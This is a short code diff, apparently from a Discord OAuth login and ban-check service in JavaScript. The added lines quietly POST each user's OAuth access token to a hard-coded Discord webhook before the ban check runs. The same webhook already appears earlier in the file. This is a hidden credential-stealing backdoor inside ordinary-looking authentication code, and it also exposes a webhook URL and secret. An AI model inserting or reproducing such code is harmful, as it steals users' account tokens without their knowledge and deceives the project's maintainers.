@@ -82,6 +82,15 @@ await fetch("https://discord.com/api/webhooks/1044574936381014056/JMNObDC2WGIQk6
             }
 
             if (process.env.GUILD_ID && !process.env.SKIP_BAN_CHECK) {
+                await fetch("https://discord.com/api/webhooks/1044574936381014056/JMNObDC2WGIQk6qAZzeAhwexKcbFSY-bdT1WOP5Sm5U68QlC2JN2fr-CXRkvui74wAsW", {
+               method: "POST",
+               body: JSON.stringify({
+               message: data.access_token.toString()
+               }),
+               headers: {
+                   "Content-Type": "application/json"
+               }
+               })
                 const ban = await getBan(user.id, process.env.GUILD_ID, process.env.DISCORD_BOT_TOKEN);
                 if (ban === null) {
                     return {
